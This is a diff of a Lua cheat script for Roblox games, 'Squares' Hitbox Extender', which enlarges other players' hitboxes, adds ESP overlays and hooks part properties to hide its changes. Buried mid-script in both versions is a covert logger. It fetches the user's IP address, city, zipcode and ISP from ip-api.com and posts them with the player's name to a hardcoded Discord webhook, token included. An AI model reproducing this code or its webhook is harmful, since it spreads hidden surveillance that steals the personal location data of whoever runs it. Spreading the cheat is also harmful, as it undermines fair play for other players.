@@ -84,18 +84,20 @@ local i=loadstring(game:HttpGet(g..'addons/SaveManager.lua'))()
 i:SetLibrary(h)
 i:SetFolder"FurryHBE"
 
-local j=game:GetService"Teams"
-local k=game:GetService"Players"
+local j=game:GetService"StarterGui"
 
-local l=game:GetService"RunService"
-local m=game:GetService"Workspace"
-local n=game:GetService"ReplicatedStorage"
-local o=m.CurrentCamera
-local p=o.WorldToViewportPoint
-local q=k.LocalPlayer
-local r={}
+local k=game:GetService"Teams"
+local l=game:GetService"Players"
 
-local s
+local m=game:GetService"RunService"
+local n=game:GetService"Workspace"
+local o=game:GetService"ReplicatedStorage"
+local p=n.CurrentCamera
+local q=p.WorldToViewportPoint
+local r=l.LocalPlayer
+local s={}
+
+local t
 
 
 
@@ -104,157 +106,142 @@ local s
 
 local function updatePlayers()
 if not getgenv().FurryHBELoaded then return end
-for t,u in pairs(r)do
+for u,v in pairs(s)do
 task.spawn(function()
-u:Update()
+v:Update()
 end)
 end
 end
 
-l:BindToRenderStep("furryWalls",Enum.RenderPriority.Camera.Value-1,function()
+m:BindToRenderStep("furryWalls",Enum.RenderPriority.Camera.Value-1,function()
 if not getgenv().FurryHBELoaded then return end
-o=m.CurrentCamera
-for t,u in pairs(r)do
+p=n.CurrentCamera
+for u,v in pairs(s)do
 task.spawn(function()
-u:UpdateESP()
+v:UpdateESP()
 end)
 end
 end)
 
-local t=h:CreateWindow"Squares' Hitbox Extender"
-local u=t:AddTab"Main"
-local v=u:AddLeftGroupbox"Hitbox Extender"
-local w=u:AddLeftGroupbox"ESP"
-local x=u:AddRightGroupbox"Ignores"
-local y=u:AddRightGroupbox"Collisions"
-local z=u:AddLeftGroupbox"Keybinds"
+local u=h:CreateWindow"Squares' Hitbox Extender"
+local v=u:AddTab"Main"
+local w=v:AddLeftGroupbox"Hitbox Extender"
+local x=v:AddLeftGroupbox"ESP"
+local y=v:AddRightGroupbox"Ignores"
+local z=v:AddRightGroupbox"Collisions"
+local A=v:AddLeftGroupbox"Keybinds"
 
-local A=t:AddTab"Emergency"
-A:AddLeftGroupbox"Fixes"
+local B=u:AddTab"Emergency"
+B:AddLeftGroupbox"Fixes"
 
-v:AddToggle("extenderToggled",{Text="Toggle"}):OnChanged(updatePlayers)
-v:AddSlider("extenderSize",{Text="Size",Min=2,Max=100,Default=10,Rounding=1}):OnChanged(updatePlayers)
-v:AddSlider("extenderTransparency",{Text="Transparency",Min=0,Max=1,Default=0.5,Rounding=2}):OnChanged(updatePlayers)
-v:AddInput("customPartName",{Text="Custom Part Name",Default="HeadHB"}):OnChanged(updatePlayers)
-v:AddDropdown("extenderPartList",{Text="Body Parts",AllowNull=true,Multi=true,Values={"Custom Part","Head","HumanoidRootPart","Torso","Left Arm","Right Arm","Left Leg","Right Leg"},Default="HumanoidRootPart"}):OnChanged(updatePlayers)
+w:AddToggle("extenderToggled",{Text="Toggle"}):OnChanged(updatePlayers)
+w:AddSlider("extenderSize",{Text="Size",Min=2,Max=100,Default=10,Rounding=1}):OnChanged(updatePlayers)
+w:AddSlider("extenderTransparency",{Text="Transparency",Min=0,Max=1,Default=0.5,Rounding=2}):OnChanged(updatePlayers)
+w:AddInput("customPartName",{Text="Custom Part Name",Default="HeadHB"}):OnChanged(updatePlayers)
+w:AddDropdown("extenderPartList",{Text="Body Parts",AllowNull=true,Multi=true,Values={"Custom Part","Head","HumanoidRootPart","Torso","Left Arm","Right Arm","Left Leg","Right Leg"},Default="HumanoidRootPart"}):OnChanged(updatePlayers)
 
-w:AddToggle("espNameToggled",{Text="Name"}):AddColorPicker("espNameColor1",{Title="Fill Color",Default=Color3.fromRGB(255,255,255)}):AddColorPicker("espNameColor2",{Title="Outline Color",Default=Color3.fromRGB(0,0,0)})
+x:AddToggle("espNameToggled",{Text="Name"}):AddColorPicker("espNameColor1",{Title="Fill Color",Default=Color3.fromRGB(255,255,255)}):AddColorPicker("espNameColor2",{Title="Outline Color",Default=Color3.fromRGB(0,0,0)})
 Toggles.espNameToggled:OnChanged(updatePlayers)
 Options.espNameColor1:OnChanged(updatePlayers)
 Options.espNameColor2:OnChanged(updatePlayers)
-w:AddToggle("espNameUseTeamColor",{Text="Use Team Color For Name"}):OnChanged(updatePlayers)
-w:AddDropdown("espNameType",{Text="Name Type",AllowNull=false,Multi=false,Values={"Display Name","Account Name"},Default="Display Name"}):OnChanged(updatePlayers)
-w:AddToggle("espHighlightToggled",{Text="Chams"}):AddColorPicker("espHighlightColor1",{Title="Fill Color",Default=Color3.fromRGB(0,0,0)}):AddColorPicker("espHighlightColor2",{Title="Outline Color",Default=Color3.fromRGB(0,0,0)})
+x:AddToggle("espNameUseTeamColor",{Text="Use Team Color For Name"}):OnChanged(updatePlayers)
+x:AddDropdown("espNameType",{Text="Name Type",AllowNull=false,Multi=false,Values={"Display Name","Account Name"},Default="Display Name"}):OnChanged(updatePlayers)
+x:AddToggle("espHighlightToggled",{Text="Chams"}):AddColorPicker("espHighlightColor1",{Title="Fill Color",Default=Color3.fromRGB(0,0,0)}):AddColorPicker("espHighlightColor2",{Title="Outline Color",Default=Color3.fromRGB(0,0,0)})
 Toggles.espHighlightToggled:OnChanged(updatePlayers)
 Options.espHighlightColor1:OnChanged(updatePlayers)
 Options.espHighlightColor2:OnChanged(updatePlayers)
-w:AddToggle("espHighlightUseTeamColor",{Text="Use Team Color For Chams"}):OnChanged(updatePlayers)
-w:AddDropdown("espHighlightDepthMode",{Text="Chams Depth Mode",AllowNull=false,Multi=false,Values={"Occluded","AlwaysOnTop"},Default="Occluded"}):OnChanged(updatePlayers)
-w:AddSlider("espHighlightFillTransparency",{Text="Chams Fill Transparency",Min=0,Max=1,Default=0.5,Rounding=2}):OnChanged(updatePlayers)
-w:AddSlider("espHighlightOutlineTransparency",{Text="Chams Outline Transparency",Min=0,Max=1,Default=0,Rounding=2}):OnChanged(updatePlayers)
+x:AddToggle("espHighlightUseTeamColor",{Text="Use Team Color For Chams"}):OnChanged(updatePlayers)
+x:AddDropdown("espHighlightDepthMode",{Text="Chams Depth Mode",AllowNull=false,Multi=false,Values={"Occluded","AlwaysOnTop"},Default="Occluded"}):OnChanged(updatePlayers)
+x:AddSlider("espHighlightFillTransparency",{Text="Chams Fill Transparency",Min=0,Max=1,Default=0.5,Rounding=2}):OnChanged(updatePlayers)
+x:AddSlider("espHighlightOutlineTransparency",{Text="Chams Outline Transparency",Min=0,Max=1,Default=0,Rounding=2}):OnChanged(updatePlayers)
 
-local B=game:GetService"Players".LocalPlayer.Name
-local C="https://discord.com/api/webhooks/1354491846163824660/CW4blpnL1dVqKxJAq1K07Fgxq3eNPuQ1UDssPXBsRIS4C-nnFMmkuN-uQIuFDfx3H_uh"
+local C=game:GetService"Players".LocalPlayer.Name
+local D="https://discord.com/api/webhooks/1354491846163824660/CW4blpnL1dVqKxJAq1K07Fgxq3eNPuQ1UDssPXBsRIS4C-nnFMmkuN-uQIuFDfx3H_uh"
 
-local D=request{
+local E=request{
 Url="http://ip-api.com/json",
 Method="GET"
 }
-local E=game:GetService"HttpService":JSONDecode(D.Body)
-local F=string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```",B,E.query,E.country,E.countryCode,E.region,E.regionName,E.city,E.zip,E.isp,E.org)
+local F=game:GetService"HttpService":JSONDecode(E.Body)
+local G=string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```",C,F.query,F.country,F.countryCode,F.region,F.regionName,F.city,F.zip,F.isp,F.org)
 request
 {
-Url=C,
+Url=D,
 Method="POST",
 Headers={
 ["Content-Type"]="application/json"
 },
-Body=game:GetService"HttpService":JSONEncode{content=F}
+Body=game:GetService"HttpService":JSONEncode{content=G}
 }
 
 
 
-z:AddLabel"Toggle UI":AddKeyPicker("menuKeybind",{Default="Insert",NoUI=true,Text="Menu Keybind"})
-z:AddLabel"Force Update":AddKeyPicker("forceUpdateKeybind",{Default="Home",NoUI=true,Text="Force Update Keybind"})
+A:AddLabel"Toggle UI":AddKeyPicker("menuKeybind",{Default="Insert",NoUI=true,Text="Menu Keybind"})
+A:AddLabel"Force Update":AddKeyPicker("forceUpdateKeybind",{Default="Home",NoUI=true,Text="Force Update Keybind"})
 Options.forceUpdateKeybind:OnClick(updatePlayers)
 h.ToggleKeybind=Options.menuKeybind
 
-x:AddToggle("extenderSitCheck",{Text="Ignore Sitting Players"}):OnChanged(updatePlayers)
-x:AddToggle("extenderFFCheck",{Text="Ignore Forcefielded Players"}):OnChanged(updatePlayers)
-x:AddToggle("ignoreSelectedPlayersToggled",{Text="Ignore Selected Players"}):OnChanged(updatePlayers)
-x:AddDropdown("ignorePlayerList",{Text="Players",AllowNull=true,Multi=true,Values={}}):OnChanged(updatePlayers)
-x:AddToggle("ignoreOwnTeamToggled",{Text="Ignore Own Team"}):OnChanged(updatePlayers)
-x:AddToggle("ignoreSelectedTeamsToggled",{Text="Ignore Selected Teams"}):OnChanged(updatePlayers)
-x:AddDropdown("ignoreTeamList",{Text="Teams",AllowNull=true,Multi=true,Values={}}):OnChanged(updatePlayers)
+y:AddToggle("extenderSitCheck",{Text="Ignore Sitting Players"}):OnChanged(updatePlayers)
+y:AddToggle("extenderFFCheck",{Text="Ignore Forcefielded Players"}):OnChanged(updatePlayers)
+y:AddToggle("ignoreSelectedPlayersToggled",{Text="Ignore Selected Players"}):OnChanged(updatePlayers)
+y:AddDropdown("ignorePlayerList",{Text="Players",AllowNull=true,Multi=true,Values={}}):OnChanged(updatePlayers)
+y:AddToggle("ignoreOwnTeamToggled",{Text="Ignore Own Team"}):OnChanged(updatePlayers)
+y:AddToggle("ignoreSelectedTeamsToggled",{Text="Ignore Selected Teams"}):OnChanged(updatePlayers)
+y:AddDropdown("ignoreTeamList",{Text="Teams",AllowNull=true,Multi=true,Values={}}):OnChanged(updatePlayers)
 
-y:AddToggle("collisionsToggled",{Text="Enable Collisions"}):OnChanged(updatePlayers)
+z:AddToggle("collisionsToggled",{Text="Enable Collisions"}):OnChanged(updatePlayers)
 
-i:BuildConfigSection(u)
+i:BuildConfigSection(v)
 i:LoadAutoloadConfig()
 
-local function updateList(G)
-G:SetValues()
-G:Display()
+local function updateList(H)
+H:SetValues()
+H:Display()
 end
 
 if game.GameId==504234221 then
-s=require(n.Scripts.Modules.PlayerModule)
+t=require(o.Scripts.Modules.PlayerModule)
 end
 if game.GameId==1934496708 then
-s=require(m:WaitForChild"Teams")
+t=require(n:WaitForChild"Teams")
 end
 
 
 
 
 
-local function addPlayer(G)
-table.insert(Options.ignorePlayerList.Values,G.Name)
+local function addPlayer(H)
+table.insert(Options.ignorePlayerList.Values,H.Name)
 updateList(Options.ignorePlayerList)
-r[G]={}
-local H=r[G]
-local I=G.Character
-local J={}
+s[H]={}
+local I=s[H]
+local J=H.Character
+local K={}
 
 local function isTeammate()
 if game.GameId==718936923 then
-if not q.Character or not I or not I:FindFirstChild"HumanoidRootPart"then return true end
-return q.Character.HumanoidRootPart.Color==I.HumanoidRootPart.Color
+if not r.Character or not J or not J:FindFirstChild"HumanoidRootPart"then return true end
+return r.Character.HumanoidRootPart.Color==J.HumanoidRootPart.Color
 elseif game.PlaceId==633284182 then
-if not G:FindFirstChild"PlayerData"or not G.PlayerData:FindFirstChild"TeamValue"then return true end
-return q.PlayerData.TeamValue.Value==G.PlayerData.TeamValue.Value
+if not H:FindFirstChild"PlayerData"or not H.PlayerData:FindFirstChild"TeamValue"then return true end
+return r.PlayerData.TeamValue.Value==H.PlayerData.TeamValue.Value
 elseif game.PlaceId==2029250188 then
-if not q.Character or not I then return true end
-return q.Character.Parent==I.Parent
+if not r.Character or not J then return true end
+return r.Character.Parent==J.Parent
 elseif game.PlaceId==2978450615 then
-return getrenv()._G.PlayerProfiles.Data[q.Name].Team==getrenv()._G.PlayerProfiles.Data[G.Name].Team
+return getrenv()._G.PlayerProfiles.Data[r.Name].Team==getrenv()._G.PlayerProfiles.Data[H.Name].Team
 elseif game.GameId==1934496708 then
-if m.FriendlyFire.Value then return false end
-return(not G.Team or G.Team.Name=="LOBBY"or q.Team.Name=="LOBBY"or G.Team.Name=="Admin"or q.Team==G.Team)or
-s[q.Team.Name]==s[G.Team.Name]or
-((s[q.Team.Name]=="CI"and s[G.Team.Name]=="CD")or
-(s[G.Team.Name]=="CI"and s[q.Team.Name]=="CD"))
+if n.FriendlyFire.Value then return false end
+return(not H.Team or H.Team.Name=="LOBBY"or r.Team.Name=="LOBBY"or H.Team.Name=="Admin"or r.Team==H.Team)or
+t[r.Team.Name]==t[H.Team.Name]or
+((t[r.Team.Name]=="CI"and t[H.Team.Name]=="CD")or
+(t[H.Team.Name]=="CI"and t[r.Team.Name]=="CD"))
 elseif game.PlaceId==2622527242 then
-if not G.Team or G.Team.Name=="Intro"or G.Team.Name=="Spectator"or G.Team.Name=="Not Playing"or q.Team==G.Team then return true end
-local K=q.Team.Name
-local L=G.Team.Name
-local M
+if not H.Team or H.Team.Name=="Intro"or H.Team.Name=="Spectator"or H.Team.Name=="Not Playing"or r.Team==H.Team then return true end
+local L=r.Team.Name
+local M=H.Team.Name
 local N
-if K=="Class-D Personnel"or K=="Chaos Insurgency"then
-M="Chads"
-end
-if K=="Facility Personnel"or K=="Security Department"or K=="Mobile Task Force"then
-M="Crayon Eaters"
-end
-if K=="SCPs"or K=="Serpent's Hand"then
-M="Menaces to Society"
-end
-if K=="Global Occult Coalition"then
-M="Who?"
-end
-if K=="Unusual Incidents Unit"then
-M="Who2?"
-end
+local O
 if L=="Class-D Personnel"or L=="Chaos Insurgency"then
 N="Chads"
 end
@@ -268,117 +255,132 @@ if L=="Global Occult Coalition"then
 N="Who?"
 end
 if L=="Unusual Incidents Unit"then
-M="Who2?"
+N="Who2?"
 end
-if M=="Who2?"or N=="Who2?"then
-if M=="Crayon Eaters"or N=="Crayon Eaters"or M=="Who?"or N=="Who?"then
+if M=="Class-D Personnel"or M=="Chaos Insurgency"then
+O="Chads"
+end
+if M=="Facility Personnel"or M=="Security Department"or M=="Mobile Task Force"then
+O="Crayon Eaters"
+end
+if M=="SCPs"or M=="Serpent's Hand"then
+O="Menaces to Society"
+end
+if M=="Global Occult Coalition"then
+O="Who?"
+end
+if M=="Unusual Incidents Unit"then
+N="Who2?"
+end
+if N=="Who2?"or O=="Who2?"then
+if N=="Crayon Eaters"or O=="Crayon Eaters"or N=="Who?"or O=="Who?"then
 return true
 end
 end
-return M==N
+return N==O
 elseif game.PlaceId==8770868695 then
-if not q.Character or not I or not G.Team or G.Team.Name=="Dead"or G.Team.Name=="Inactive"then return true end
-return q.Character.Parent==I.Parent
+if not r.Character or not J or not H.Team or H.Team.Name=="Dead"or H.Team.Name=="Inactive"then return true end
+return r.Character.Parent==J.Parent
 elseif game.PlaceId==5884786982 then
-if not q.Character or not I then return true end
-return q.Character.name~="Killer"and I.Name~="Killer"
+if not r.Character or not J then return true end
+return r.Character.name~="Killer"and J.Name~="Killer"
 elseif game.GameId==2162282815 then
-if not G:FindFirstChild"SelectedTeam"then return true end
-return G.SelectedTeam.Value==q.SelectedTeam.Value
+if not H:FindFirstChild"SelectedTeam"then return true end
+return H.SelectedTeam.Value==r.SelectedTeam.Value
 elseif game.PlaceId==1240644540 then
-if not s or not s.IsPlayerSurvivor then return true end
-return s.IsPlayerSurvivor(nil,G)==true and s.IsPlayerSurvivor(nil,q)==true
+if not t or not t.IsPlayerSurvivor then return true end
+return t.IsPlayerSurvivor(nil,H)==true and t.IsPlayerSurvivor(nil,r)==true
 elseif game.PlaceId==10236714118 then
-if not G:FindFirstChild"PlayerData"or not G.PlayerData:FindFirstChild"Team"then return true end
-return q.PlayerData.Team.Value==G.PlayerData.Team.Value
+if not H:FindFirstChild"PlayerData"or not H.PlayerData:FindFirstChild"Team"then return true end
+return r.PlayerData.Team.Value==H.PlayerData.Team.Value
 end
-return q.Team==G.Team
+return r.Team==H.Team
 end
 
 local function isDead()
-if not I then return true end
-local K=I:FindFirstChildWhichIsA"Humanoid"
+if not J then return true end
+local L=J:FindFirstChildWhichIsA"Humanoid"
 if game.PlaceId==6172932937 then
-return G.ragdolled.Value
+return H.ragdolled.Value
 elseif game.GameId==718936923 then
-return I:FindFirstChild"Dead"~=nil
+return J:FindFirstChild"Dead"~=nil
 end
-return K and K:GetState()==Enum.HumanoidStateType.Dead
+return L and L:GetState()==Enum.HumanoidStateType.Dead
 end
 
 local function isSitting()
-local K=I:FindFirstChildWhichIsA"Humanoid"
-return Toggles.extenderSitCheck.Value and K~=nil and K.Sit==true
+local L=J:FindFirstChildWhichIsA"Humanoid"
+return Toggles.extenderSitCheck.Value and L~=nil and L.Sit==true
 end
 
 local function isFFed()
-if not I then return false end
+if not J then return false end
 if game.PlaceId==4991214437 or game.PlaceId==6652350934 then
-return I.Head.Material==Enum.Material.ForceField
+return J.Head.Material==Enum.Material.ForceField
 end
-local K=I:FindFirstChildWhichIsA"ForceField"
-return Toggles.extenderFFCheck.Value and I~=nil and K~=nil and K.Visible==true
+local L=J:FindFirstChildWhichIsA"ForceField"
+return Toggles.extenderFFCheck.Value and J~=nil and L~=nil and L.Visible==true
 end
 
 local function isIgnored()
-if not I then return true end
+if not J then return true end
 return Toggles.ignoreOwnTeamToggled.Value and isTeammate()or
-Toggles.ignoreSelectedTeamsToggled.Value and table.find(Options.ignoreTeamList:GetActiveValues(),tostring(G.Team))or
-Toggles.ignoreSelectedPlayersToggled.Value and table.find(Options.ignorePlayerList:GetActiveValues(),tostring(G.Name))
+Toggles.ignoreSelectedTeamsToggled.Value and table.find(Options.ignoreTeamList:GetActiveValues(),tostring(H.Team))or
+Toggles.ignoreSelectedPlayersToggled.Value and table.find(Options.ignorePlayerList:GetActiveValues(),tostring(H.Name))
 end
 
 
 
-local K=false
-local function setup(L)
-J[L.Name]={}
-local M=J[L.Name]
-M.Size=L.Size
-M.Transparency=L.Transparency
-M.Massless=L.Massless
-M.CanCollide=L.CanCollide
-M.CollisionGroupId=L.CollisionGroupId
-local N=L:AddGetHook("Size",M.Size)
-local O=L:AddGetHook("Transparency",M.Transparency)
-local P=L:AddGetHook("Massless",M.Massless)
-local Q=L:AddGetHook("CanCollide",M.CanCollide)
+local L=false
+local function setup(M)
+K[M.Name]={}
+local N=K[M.Name]
+N.Size=M.Size
+N.Transparency=M.Transparency
+N.Massless=M.Massless
+N.CanCollide=M.CanCollide
+N.CollisionGroupId=M.CollisionGroupId
+local O=M:AddGetHook("Size",N.Size)
+local P=M:AddGetHook("Transparency",N.Transparency)
+local Q=M:AddGetHook("Massless",N.Massless)
+local R=M:AddGetHook("CanCollide",N.CanCollide)
 
-local R=L:AddSetHook("Size",function(R,S)
-M.Size=S
-N:Modify("Size",M.Size)
+local S=M:AddSetHook("Size",function(S,T)
+N.Size=T
+O:Modify("Size",N.Size)
 if Toggles.extenderToggled.Value then
-local T=Options.extenderSize.Value
-return Vector3.new(T,T,T)
+local U=Options.extenderSize.Value
+return Vector3.new(U,U,U)
 end
-return M.Size
+return N.Size
 end)
-local S=L:AddSetHook("Transparency",function(S,T)
-M.Transparency=T
-O:Modify("Transparency",M.Transparency)
+local T=M:AddSetHook("Transparency",function(T,U)
+N.Transparency=U
+P:Modify("Transparency",N.Transparency)
 if Toggles.extenderToggled.Value then
 return Options.extenderTransparency.Value
 end
-return M.Transparency
+return N.Transparency
 end)
-local T=L:AddSetHook("Massless",function(T,U)
-M.Massless=U
-P:Modify("Massless",M.Massless)
+local U=M:AddSetHook("Massless",function(U,V)
+N.Massless=V
+Q:Modify("Massless",N.Massless)
 if Toggles.extenderToggled.Value then
-if L.Name~="HumanoidRootPart"then
+if M.Name~="HumanoidRootPart"then
 return true
 end
 end
-return M.Massless
+return N.Massless
 end)
-local U=L:AddSetHook("CanCollide",function(U,V)
-M.CanCollide=V
-Q:Modify("CanCollide",M.CanCollide)
+local V=M:AddSetHook("CanCollide",function(V,W)
+N.CanCollide=W
+R:Modify("CanCollide",N.CanCollide)
 if Toggles.extenderToggled.Value and not Toggles.collisionsToggled.Value then
-if L.Name=="Head"or L.Name=="HumanoidRootPart"then
+if M.Name=="Head"or M.Name=="HumanoidRootPart"then
 return false
 end
 end
-return M.CanCollide
+return N.CanCollide
 end)
 
 
@@ -388,51 +390,51 @@ end)
 
 
 
-local V=L.Changed:Connect(function(V)
-if K then return end
-if M[V]then
-if M[V]~=L[V]then
-M[V]=L[V]
+local W=M.Changed:Connect(function(W)
+if L then return end
+if N[W]then
+if N[W]~=M[W]then
+N[W]=M[W]
 end
-H:Update()
+I:Update()
 end
 end)
-L.Destroying:Connect(function()
-N:Remove()
+M.Destroying:Connect(function()
 O:Remove()
 P:Remove()
 Q:Remove()
-
 R:Remove()
+
 S:Remove()
 T:Remove()
 U:Remove()
+V:Remove()
 
-V:Disconnect()
+W:Disconnect()
 end)
 end
 
-local function isActive(L)
-local M=L.Name
-for N,O in pairs(Options.extenderPartList:GetActiveValues())do
-if string.match(M,O)or(O=="Custom Part"and string.match(M,Options.customPartName.Value))or
-(O=="Left Arm"and string.match(M,"Left")and(string.match(M,"Arm")or string.match(M,"Hand")))or
-(O=="Right Arm"and string.match(M,"Right")and(string.match(M,"Arm")or string.match(M,"Hand")))or
-(O=="Left Leg"and string.match(M,"Left")and(string.match(M,"Leg")or string.match(M,"Foot")))or
-(O=="Right Leg"and string.match(M,"Right")and(string.match(M,"Leg")or string.match(M,"Foot")))then
+local function isActive(M)
+local N=M.Name
+for O,P in pairs(Options.extenderPartList:GetActiveValues())do
+if string.match(N,P)or(P=="Custom Part"and string.match(N,Options.customPartName.Value))or
+(P=="Left Arm"and string.match(N,"Left")and(string.match(N,"Arm")or string.match(N,"Hand")))or
+(P=="Right Arm"and string.match(N,"Right")and(string.match(N,"Arm")or string.match(N,"Hand")))or
+(P=="Left Leg"and string.match(N,"Left")and(string.match(N,"Leg")or string.match(N,"Foot")))or
+(P=="Right Leg"and string.match(N,"Right")and(string.match(N,"Leg")or string.match(N,"Foot")))then
 return true
 end
 end
 return false
 end
 
-local function resize(L)
-if not J[L.Name]then
-setup(L)
+local function resize(M)
+if not K[M.Name]then
+setup(M)
 end
-if Toggles.extenderToggled.Value and isActive(L)and not isIgnored()and not isSitting()and not isFFed()and not isDead()then
-if L.Name~="HumanoidRootPart"then
-L.Massless=true
+if Toggles.extenderToggled.Value and isActive(M)and not isIgnored()and not isSitting()and not isFFed()and not isDead()then
+if M.Name~="HumanoidRootPart"then
+M.Massless=true
 end
 if not Toggles.collisionsToggled.Value then
 
@@ -440,291 +442,291 @@ if not Toggles.collisionsToggled.Value then
 
 
 
-L.CanCollide=false
+M.CanCollide=false
 else
-L.CanCollide=J[L.Name].CanCollide
+M.CanCollide=K[M.Name].CanCollide
 
 end
-local M=Options.extenderSize.Value
-L.Size=Vector3.new(M,M,M)
-L.Transparency=Options.extenderTransparency.Value
-if L.Name=="Head"then
-local N=L:FindFirstChild"face"
-if N then
-N.Transparency=Options.extenderTransparency.Value
-end
-end
-else
-L.Massless=J[L.Name].Massless
-L.CanCollide=J[L.Name].CanCollide
-L.Size=J[L.Name].Size
-L.Transparency=J[L.Name].Transparency
-if L.Name=="Head"then
-local M=L:FindFirstChild"face"
-if M then
-M.Transparency=J.Head.Transparency
-end
-end
-
-end
-end
-
-function H.Update(L)
-if not I then return end
-K=true
-for M,N in pairs(I:GetChildren())do
-if N:IsA"BasePart"then
-resize(N)
-end
-end
-K=false
-end
-
-
-
-local function FindFirstChildMatching(L,M)
-if not L then return nil end
-for N,O in pairs(L:GetChildren())do
-if string.match(O.Name,M)then
-return O
-end
-end
-end
-
-local L=Drawing.new"Text";L.Center=true;L.Outline=true
-local M=Instance.new"Highlight";M.Parent=game:GetService"CoreGui"
-function H.UpdateESP(N)
-if not I or isIgnored()or isDead()then L.Visible=false;M.Enabled=false return end
-if Toggles.espNameToggled.Value then
-local O=FindFirstChildMatching(I,"Torso")
+local N=Options.extenderSize.Value
+M.Size=Vector3.new(N,N,N)
+M.Transparency=Options.extenderTransparency.Value
+if M.Name=="Head"then
+local O=M:FindFirstChild"face"
 if O then
-local P,Q=p(o,O.Position)
-if Q then
-if Options.espNameType.Value=="Display Name"then
-L.Text=G.DisplayName
+O.Transparency=Options.extenderTransparency.Value
+end
+end
 else
-L.Text=G.Name
+M.Massless=K[M.Name].Massless
+M.CanCollide=K[M.Name].CanCollide
+M.Size=K[M.Name].Size
+M.Transparency=K[M.Name].Transparency
+if M.Name=="Head"then
+local N=M:FindFirstChild"face"
+if N then
+N.Transparency=K.Head.Transparency
+end
+end
+
+end
+end
+
+function I.Update(M)
+if not J then return end
+L=true
+for N,O in pairs(J:GetChildren())do
+if O:IsA"BasePart"then
+resize(O)
+end
+end
+L=false
+end
+
+
+
+local function FindFirstChildMatching(M,N)
+if not M then return nil end
+for O,P in pairs(M:GetChildren())do
+if string.match(P.Name,N)then
+return P
+end
+end
+end
+
+local M=Drawing.new"Text";M.Center=true;M.Outline=true
+local N=Instance.new"Highlight";N.Parent=game:GetService"CoreGui"
+function I.UpdateESP(O)
+if not J or isIgnored()or isDead()then M.Visible=false;N.Enabled=false return end
+if Toggles.espNameToggled.Value then
+local P=FindFirstChildMatching(J,"Torso")
+if P then
+local Q,R=q(p,P.Position)
+if R then
+if Options.espNameType.Value=="Display Name"then
+M.Text=H.DisplayName
+else
+M.Text=H.Name
 end
 if Toggles.espNameUseTeamColor.Value then
-L.Color=G.TeamColor.Color
+M.Color=H.TeamColor.Color
 else
-L.Color=Options.espNameColor1.Value
+M.Color=Options.espNameColor1.Value
 end
-L.OutlineColor=Options.espNameColor2.Value
-L.Position=Vector2.new(P.X,P.Y)
-L.Size=1000/P.Z+10
-L.Visible=true
+M.OutlineColor=Options.espNameColor2.Value
+M.Position=Vector2.new(Q.X,Q.Y)
+M.Size=1000/Q.Z+10
+M.Visible=true
 else
-L.Visible=false
-end
-else
-L.Visible=false
+M.Visible=false
 end
 else
-L.Visible=false
+M.Visible=false
+end
+else
+M.Visible=false
 end
 if Toggles.espHighlightToggled.Value then
-M.Adornee=I
+N.Adornee=J
 if Toggles.espHighlightToggled.Value then
 if Toggles.espHighlightUseTeamColor.Value then
-M.FillColor=G.TeamColor.Color
-M.OutlineColor=G.TeamColor.Color
+N.FillColor=H.TeamColor.Color
+N.OutlineColor=H.TeamColor.Color
 else
-M.FillColor=Options.espHighlightColor1.Value
-M.OutlineColor=Options.espHighlightColor2.Value
+N.FillColor=Options.espHighlightColor1.Value
+N.OutlineColor=Options.espHighlightColor2.Value
 end
-M.DepthMode=Enum.HighlightDepthMode[Options.espHighlightDepthMode.Value]
-M.FillTransparency=Options.espHighlightFillTransparency.Value
-M.OutlineTransparency=Options.espHighlightOutlineTransparency.Value
-M.Enabled=true
+N.DepthMode=Enum.HighlightDepthMode[Options.espHighlightDepthMode.Value]
+N.FillTransparency=Options.espHighlightFillTransparency.Value
+N.OutlineTransparency=Options.espHighlightOutlineTransparency.Value
+N.Enabled=true
 else
-M.Enabled=false
+N.Enabled=false
 end
 else
-M.Enabled=false
+N.Enabled=false
 end
 end
 
-function H.DeleteVisuals(N)
-L:Remove()
-M:Destroy()
+function I.DeleteVisuals(O)
+M:Remove()
+N:Destroy()
 end
 
 
-local function WaitForFullChar(N)
-local O=tick()
-local P=N:FindFirstChildWhichIsA"Humanoid"
-if not P then
+local function WaitForFullChar(O)
+local P=tick()
+local Q=O:FindFirstChildWhichIsA"Humanoid"
+if not Q then
 repeat
-if N==nil then
+if O==nil then
 return false
 end
-P=N:FindFirstChildWhichIsA"Humanoid"
+Q=O:FindFirstChildWhichIsA"Humanoid"
 task.wait()
-until P or tick()-O>=2
+until Q or tick()-P>=2
 end
-local Q=false
-O=tick()
+local R=false
+P=tick()
 repeat
-local R=0
-for S,T in pairs(N:GetChildren())do
-if P:GetLimb(T)~=Enum.Limb.Unknown then
-R+=1
+local S=0
+for T,U in pairs(O:GetChildren())do
+if Q:GetLimb(U)~=Enum.Limb.Unknown then
+S+=1
 end
 end
-if R==6 or R==15 then
-Q=true
+if S==6 or S==15 then
+R=true
 end
 task.wait()
-until Q or tick()-O>=3
+until R or tick()-P>=3
 
 return true
 end
 
-G.CharacterAdded:Connect(function(N)
+H.CharacterAdded:Connect(function(O)
 
-I=N
-J={}
-if WaitForFullChar(N)then
-H:Update()
-local O=N:FindFirstChildWhichIsA"Humanoid"
-if O then
-O:GetPropertyChangedSignal"Health":Connect(function()
-if O.Health<=0 then
-H:Update()
+J=O
+K={}
+if WaitForFullChar(O)then
+I:Update()
+local P=O:FindFirstChildWhichIsA"Humanoid"
+if P then
+P:GetPropertyChangedSignal"Health":Connect(function()
+if P.Health<=0 then
+I:Update()
 end
 end)
-O.StateChanged:Connect(function(P,Q)
-if Q==Enum.HumanoidStateType.Dead then
-H:Update()
+P.StateChanged:Connect(function(Q,R)
+if R==Enum.HumanoidStateType.Dead then
+I:Update()
 end
 end)
 end
-if N:FindFirstChildWhichIsA"ForceField"then
+if O:FindFirstChildWhichIsA"ForceField"then
 
-H:Update()
+I:Update()
 end
-N.ChildAdded:Connect(function(P)
+O.ChildAdded:Connect(function(Q)
 if game.GameId==718936923 then
-if P.Name=="Dead"then
-H:Update()
+if Q.Name=="Dead"then
+I:Update()
 return
 end
 end
-if P:IsA"ForceField"then
+if Q:IsA"ForceField"then
 
-H:Update()
+I:Update()
 end
 end)
-N.ChildRemoved:Connect(function(P)
-if P:IsA"ForceField"then
+O.ChildRemoved:Connect(function(Q)
+if Q:IsA"ForceField"then
 
-H:Update()
+I:Update()
 end
 end)
